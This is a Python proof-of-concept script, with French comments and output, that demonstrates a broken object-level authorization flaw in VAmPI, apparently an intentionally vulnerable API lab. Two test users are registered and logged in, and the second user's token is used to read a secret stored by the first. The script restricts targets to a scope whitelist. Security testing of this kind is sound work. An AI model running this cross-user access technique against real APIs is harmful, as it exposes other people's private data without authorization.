from __future__ import annotations

import argparse
import sys
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from core import scope

USER_A = {"username": "bola_userA", "password": "PassA123!", "email": "a@example.test"}
USER_B = {"username": "bola_userB", "password": "PassB123!", "email": "b@example.test"}
BOOK = {"book_title": "carnet-prive-de-A", "secret": "SECRET-CONFIDENTIEL-DE-A"}


def _auth_header(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def _register(base: str, user: dict) -> None:
    r = requests.post(f"{base}/users/v1/register", json=user, timeout=15)
    print(f"  register {user['username']}: HTTP {r.status_code}")


def _login(base: str, user: dict) -> str:
    r = requests.post(
        f"{base}/users/v1/login",
        json={"username": user["username"], "password": user["password"]},
        timeout=15,
    )
    r.raise_for_status()
    data = r.json()
    token = data.get("auth_token") or data.get("token") or ""
    if not token:
        raise RuntimeError(f"Token introuvable dans la réponse de login : {data}")
    print(f"  login {user['username']}: token obtenu")
    return token


def run_bola(base: str) -> bool:
    print("[1] Reset de la base VAmPI (/createdb)")
    try:
        requests.get(f"{base}/createdb", timeout=15)
    except requests.RequestException as exc:
        print(f"  (avertissement) /createdb inaccessible : {exc}")

    print("[2] Enregistrement de userA et userB")
    _register(base, USER_A)
    _register(base, USER_B)

    print("[3] Authentification des deux users")
    token_a = _login(base, USER_A)
    token_b = _login(base, USER_B)

    print("[4] userA crée un livre avec un secret privé")
    r = requests.post(
        f"{base}/books/v1",
        json=BOOK,
        headers=_auth_header(token_a),
        timeout=15,
    )
    print(f"  POST /books/v1 (userA): HTTP {r.status_code}")

    print("[5] userB tente de lire le livre de userA via son titre")
    r = requests.get(
        f"{base}/books/v1/{BOOK['book_title']}",
        headers=_auth_header(token_b),
        timeout=15,
    )
    print(f"  GET /books/v1/{BOOK['book_title']} (userB): HTTP {r.status_code}")
    body = r.text
    print(f"  Réponse reçue par userB : {body}")

    leaked = BOOK["secret"] in body
    print("\n" + "=" * 60)
    if leaked:
        print("RÉSULTAT : BOLA CONFIRMÉE ❌")
        print(f"  userB a lu le secret de userA : {BOOK['secret']!r}")
        print("  Un scan automatique voit un simple HTTP 200 et ne détecte RIEN.")
    else:
        print("RÉSULTAT : secret NON exposé (VAmPI en mode non vulnérable ?)")
    print("=" * 60)
    return leaked


def main() -> int:
    parser = argparse.ArgumentParser(description="Preuve BOLA sur VAmPI")
    parser.add_argument("--target", default="vampi", help="cible (whitelist scope)")
    args = parser.parse_args()

    try:
        allowed = scope.assert_in_scope(args.target)
    except scope.ScopeError as exc:
        print(f"[scope] REFUSÉ : {exc}", file=sys.stderr)
        return 2

    base = allowed.base_url()
    print(f"Cible autorisée : {allowed.name} -> {base}\n")
    try:
        leaked = run_bola(base)
    except requests.RequestException as exc:
        print(f"[erreur réseau] VAmPI injoignable : {exc}", file=sys.stderr)
        return 3
    return 0 if leaked else 1


if __name__ == "__main__":
    raise SystemExit(main())
